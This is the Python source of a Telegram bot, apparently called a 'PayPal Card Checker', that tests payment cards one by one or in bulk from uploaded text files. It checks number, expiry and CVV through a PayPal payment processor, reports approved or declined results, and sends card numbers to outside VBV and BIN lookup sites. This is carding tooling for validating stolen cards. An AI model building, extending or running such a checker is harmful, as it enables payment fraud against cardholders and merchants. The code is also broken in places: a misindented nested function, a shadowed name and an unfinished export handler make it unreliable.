import logging
import asyncio
import json
import html
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import os
import httpx
from main import PayPalProcessor

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Replace the admin section with this updated version
ADMIN_OWNER_ID = 6036153411
ADMIN_OWNER_USERNAME = 'NexusXD17'
ADMIN_IDS = [ADMIN_OWNER_ID, 6036153411]  # Remove the duplicate

def is_admin(user_id: int, username: str = None) -> bool:
    """Check if user is admin/owner"""
    # Debug logging - remove this in production
    print(f"Checking admin status for user_id: {user_id}, username: {username}")
    print(f"ADMIN_OWNER_ID: {ADMIN_OWNER_ID}, ADMIN_OWNER_USERNAME: {ADMIN_OWNER_USERNAME}")
    print(f"ADMIN_IDS: {ADMIN_IDS}")
    
    if user_id == ADMIN_OWNER_ID:
        print("Matched by ADMIN_OWNER_ID")
        return True
    if username and username.lower() == ADMIN_OWNER_USERNAME.lower():
        print("Matched by ADMIN_OWNER_USERNAME")
        return True
    if user_id in ADMIN_IDS:
        print("Matched by ADMIN_IDS")
        return True
    print("Not an admin")
    return False
    
    async def check_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check if user is admin"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    is_user_admin = is_admin(user_id, username)
    
    await update.message.reply_text(
        f"Your user ID: {user_id}\n"
        f"Your username: @{username if username else 'None'}\n"
        f"Admin status: {'✅ Yes' if is_user_admin else '❌ No'}",
        parse_mode=ParseMode.HTML
    )

# Initialize PayPal processor
processor = PayPalProcessor()

async def get_vbv_info(card_number: str) -> str:
    """Fetch VBV (Verified by Visa) information for a card"""
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"https://ronak.xyz/vbv.php?lista={card_number}")
            if response.status_code == 200:
                return response.text.strip()
    except Exception as e:
        logger.error(f"Error fetching VBV info: {e}")
    return "Unknown"

def get_bin_info(bin_number: str) -> dict:
    """Fetch BIN information from API"""
    import requests
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {
        "brand": "UNKNOWN",
        "type": "UNKNOWN",
        "country_name": "UNKNOWN",
        "country_flag": "🏳",
        "bank": "UNKNOWN"
    }


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command handler"""
    welcome_text = """
🤖 <b>PayPal Card Checker Bot</b>

<b>Commands:</b>
• <code>/pp CARD|MM|YYYY|CVV</code> - Check single card
  Example: <code>/pp 4987780029794225|06|2030|455</code>

• <code>/mpp</code> - Mass check (send file after command)
  Send a .txt file with cards (one per line)

• <code>/mpp CARD|MM|YYYY|CVV [CARD2|...] </code> - Direct mass check (max 5 cards)
  Example: <code>/mpp 4987780029794225|06|2030|455 4532111111111111|12|2025|123</code>

<b>File format example (.txt):</b>
<code>4987780029794225|06|2030|455
4532111111111111|12|2025|123
5555555555554444|03|2026|789</code>

Limit: 5 cards per mass check (unlimited for admins)
    """
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML)


async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle single card check with /pp command"""
    if not context.args:
        await update.message.reply_text("❌ Usage: <code>/pp CARD|MM|YYYY|CVV</code>", parse_mode=ParseMode.HTML)
        return
    
    card_data = context.args[0]
    
    try:
        parts = card_data.split('|')
        if len(parts) != 4:
            await update.message.reply_text("❌ Invalid format. Use: <code>CARD|MM|YYYY|CVV</code>", parse_mode=ParseMode.HTML)
            return
        
        cc, mm, yyyy, cvv = parts
        
        # Validate
        if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
            await update.message.reply_text("❌ Invalid card number", parse_mode=ParseMode.HTML)
            return
        if not (mm.isdigit() and 1 <= int(mm) <= 12):
            await update.message.reply_text("❌ Invalid month (01-12)", parse_mode=ParseMode.HTML)
            return
        if not (yyyy.isdigit() and len(yyyy) == 4):
            await update.message.reply_text("❌ Invalid year (YYYY format)", parse_mode=ParseMode.HTML)
            return
        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
            await update.message.reply_text("❌ Invalid CVV (3-4 digits)", parse_mode=ParseMode.HTML)
            return
        
        import time
        start_time = time.time()
        
        await update.message.reply_text("⏳ Checking card...", parse_mode=ParseMode.HTML)
        
        # Run in executor to avoid blocking
        result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
        
        vbv_info = await get_vbv_info(cc)
        bin_info = get_bin_info(cc[:6])
        
        time_taken = time.time() - start_time
        
        requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        
        status_emoji = result['emoji']
        masked_card = f"{cc[:6]}******{cc[-4:]}|{mm}|{yyyy}|{cvv}"
        
        response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐩𝐚𝐲𝐩𝐚𝐥 𝐚𝐮𝐭𝐡
━━━━━━━━━
𝐂𝐂 ➜ <code>{html.escape(masked_card)}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_emoji}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['msg'])}
𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {cc[:6]}
𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}
𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
━━━━━━━━━
𝗧/𝘁 : {time_taken:.2f}s
𝐑𝐄𝐐 : @{requester_username}
𝐃𝐄𝐕 : @mumiru"""
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode=ParseMode.HTML)


async def check_mass_direct(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle mass card check with direct input or file"""
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    
    if context.args:
        # Direct mass check
        cards_data = context.args
        
        if len(cards_data) > 5 and not is_admin(user_id, username):
            await update.message.reply_text("❌ Maximum 5 cards allowed per check for users! (Admins have unlimited access)", parse_mode=ParseMode.HTML)
            return
        
        await update.message.reply_text(f"⏳ Checking {len(cards_data)} card(s)...", parse_mode=ParseMode.HTML)
        
        results = []
        for idx, card_data in enumerate(cards_data, 1):
            try:
                parts = card_data.split('|')
                if len(parts) != 4:
                    results.append(f"❌ Card {idx}: Invalid format")
                    continue
                
                cc, mm, yyyy, cvv = parts
                
                # Validate
                if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
                    results.append(f"❌ Card {idx}: Invalid card number")
                    continue
                if not (mm.isdigit() and 1 <= int(mm) <= 12):
                    results.append(f"❌ Card {idx}: Invalid month")
                    continue
                if not (yyyy.isdigit() and len(yyyy) == 4):
                    results.append(f"❌ Card {idx}: Invalid year")
                    continue
                if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                    results.append(f"❌ Card {idx}: Invalid CVV")
                    continue
                
                # Check card
                result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
                results.append(f"{result['emoji']} Card {idx}: {result['msg']}")
                
            except Exception as e:
                results.append(f"❌ Card {idx}: Error - {str(e)}")
        
        response = "\n".join(results)
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
    
    else:
        # Wait for file
        context.user_data['waiting_for_file'] = True
        is_user_admin = is_admin(user_id, username)
        limit_msg = "max 5 cards for users, unlimited for admins" if not is_user_admin else "unlimited for admins"
        await update.message.reply_text(f"📁 Send a .txt file with cards (one per line, {limit_msg})", parse_mode=ParseMode.HTML)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle document (file) upload for mass check"""
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    
    # Check if we're waiting for a file
    if not context.user_data.get('waiting_for_file'):
        return
    
    document = update.message.document
    
    # Check file type
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file with card information", parse_mode=ParseMode.HTML)
        return
    
    try:
        # Check file size (limit to 5MB)
        if document.file_size > 5 * 1024 * 1024:  # 5MB
            await update.message.reply_text("❌ File too large. Maximum size is 5MB", parse_mode=ParseMode.HTML)
            context.user_data['waiting_for_file'] = False
            return
        
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        cards_text = file_content.decode('utf-8').strip()
        
        # Process the file content
        cards_data = []
        invalid_lines = []
        
        for line_num, line in enumerate(cards_text.split('\n'), 1):
            line = line.strip()
            if not line:
                continue
                
            # Check if line contains card information
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards_data.append(line)
                else:
                    invalid_lines.append(f"Line {line_num}: Invalid format (expected CARD|MM|YYYY|CVV)")
            else:
                # Try to parse different formats
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 4:
                        cards_data.append('|'.join(parts))
                    else:
                        invalid_lines.append(f"Line {line_num}: Invalid format")
                elif ' ' in line:
                    parts = line.split()
                    if len(parts) == 4:
                        cards_data.append('|'.join(parts))
                    else:
                        invalid_lines.append(f"Line {line_num}: Invalid format")
                else:
                    invalid_lines.append(f"Line {line_num}: Invalid format")
        
        # Check limits
        is_admin = is_admin(user_id, username)
        max_cards = 100 if is_admin else 5
        
        if len(cards_data) > max_cards:
            await update.message.reply_text(f"❌ Too many cards. Maximum {max_cards} cards allowed per check", parse_mode=ParseMode.HTML)
            context.user_data['waiting_for_file'] = False
            return
        
        if len(cards_data) == 0:
            await update.message.reply_text("❌ No valid cards found in file", parse_mode=ParseMode.HTML)
            if invalid_lines:
                invalid_summary = "\n".join(invalid_lines[:5])  # Show first 5 errors
                if len(invalid_lines) > 5:
                    invalid_summary += f"\n... and {len(invalid_lines) - 5} more errors"
                await update.message.reply_text(f"File errors:\n{invalid_summary}", parse_mode=ParseMode.HTML)
            context.user_data['waiting_for_file'] = False
            return
        
        # Send initial message
        progress_message = await update.message.reply_text(
            f"⏳ Processing {len(cards_data)} card(s)...\n\n"
            f"Valid cards: {len(cards_data)}\n"
            f"Invalid lines: {len(invalid_lines)}",
            parse_mode=ParseMode.HTML
        )
        
        # Process cards
        results = []
        approved = 0
        declined = 0
        
        for idx, card_data in enumerate(cards_data, 1):
            try:
                # Update progress
                if idx % 5 == 0 or idx == len(cards_data):
                    await progress_message.edit_text(
                        f"⏳ Processing {len(cards_data)} card(s)...\n\n"
                        f"Progress: {idx}/{len(cards_data)} ({idx/len(cards_data)*100:.1f}%)\n"
                        f"Approved: {approved} | Declined: {declined}",
                        parse_mode=ParseMode.HTML
                    )
                
                parts = card_data.split('|')
                cc, mm, yyyy, cvv = parts
                
                # Validate
                if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
                    results.append(f"❌ Card {idx}: Invalid card number")
                    declined += 1
                    continue
                if not (mm.isdigit() and 1 <= int(mm) <= 12):
                    results.append(f"❌ Card {idx}: Invalid month")
                    declined += 1
                    continue
                if not (yyyy.isdigit() and len(yyyy) == 4):
                    results.append(f"❌ Card {idx}: Invalid year")
                    declined += 1
                    continue
                if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                    results.append(f"❌ Card {idx}: Invalid CVV")
                    declined += 1
                    continue
                
                # Check card
                result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
                
                if 'APPROVED' in result['status']:
                    approved += 1
                else:
                    declined += 1
                
                # Get additional info for approved cards
                if 'APPROVED' in result['status']:
                    vbv_info = await get_vbv_info(cc)
                    bin_info = get_bin_info(cc[:6])
                    masked_card = f"{cc[:6]}******{cc[-4:]}|{mm}|{yyyy}|{cvv}"
                    
                    results.append(
                        f"✅ Card {idx}: {result['msg']}\n"
                        f"📋 Card: {masked_card}\n"
                        f"🌍 Country: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}\n"
                        f"🏦 Bank: {bin_info.get('bank', 'N/A')}\n"
                        f"🔐 VBV: {vbv_info}"
                    )
                else:
                    results.append(f"❌ Card {idx}: {result['msg']}")
                
            except Exception as e:
                results.append(f"❌ Card {idx}: Error - {str(e)}")
                declined += 1
        
        # Prepare summary
        summary = f"""
📊 <b>Check Summary</b>
━━━━━━━━━━━━━━━━
Total Cards: {len(cards_data)}
Approved: {approved}
Declined: {declined}
Success Rate: {approved/len(cards_data)*100:.1f}%
━━━━━━━━━━━━━━━━
        """
        
        # Send summary
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)
        
        # Send results in chunks if needed
        if len(results) <= 10:
            # Send all results at once
            response = "\n\n".join(results)
            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        else:
            # Send results in chunks
            chunk_size = 10
            for i in range(0, len(results), chunk_size):
                chunk = results[i:i+chunk_size]
                response = "\n\n".join(chunk)
                await update.message.reply_text(response, parse_mode=ParseMode.HTML)
                await asyncio.sleep(1)  # Avoid rate limiting
        
        # Send invalid lines if any
        if invalid_lines:
            invalid_summary = "\n".join(invalid_lines[:10])  # Show first 10 errors
            if len(invalid_lines) > 10:
                invalid_summary += f"\n... and {len(invalid_lines) - 10} more errors"
            
            await update.message.reply_text(
                f"⚠️ <b>Invalid Lines in File</b>:\n{invalid_summary}",
                parse_mode=ParseMode.HTML
            )
        
        # Reset waiting state
        context.user_data['waiting_for_file'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)}", parse_mode=ParseMode.HTML)
        context.user_data['waiting_for_file'] = False


async def export_results(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Export results to a txt file"""
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    
    # Only allow admins to use this command
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is only available to admins", parse_mode=ParseMode.HTML)
        return
    
    # Check if there are results to export
    if 'last_results' not in context.user_data:
        await update.message.reply_text("❌ No results to export", parse_mode=ParseMode.HTML)
        return
    
    results = context.user_data['last_results']


async def main() -> None:
    """Start the bot"""
    TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
    
    if not TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN environment variable not set")
        print("Please set it using: replit secrets")
        return
    
    # Create the Application
    application = Application.builder().token(TOKEN).build()
    
    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("pp", check_single))
    application.add_handler(CommandHandler("mpp", check_mass_direct))
    application.add_handler(CommandHandler("admin", check_admin))  # ADD THIS LINE
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Start the Bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    print("✅ Bot started and polling...")
    
    # Run until you send an interrupt signal
    await asyncio.Event().wait()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n❌ Bot stopped")
